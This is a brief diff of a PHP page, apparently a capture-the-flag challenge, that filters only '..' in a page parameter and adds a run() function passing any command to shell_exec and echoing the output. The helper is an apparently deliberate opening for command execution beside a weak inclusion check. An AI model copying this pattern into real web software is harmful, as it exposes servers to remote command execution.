@@ -9,6 +9,11 @@ $nav = [
 ];
 $page = $_GET['page'] ?? 'Home';
 if (strpos($page, '..') !== false) die("Isn't LFI?");
+function run($cmd) {
+    echo '<pre>';
+    echo htmlentities(shell_exec($cmd));
+    echo '</pre>';
+}
 ?>
 
 <!DOCTYPE html>
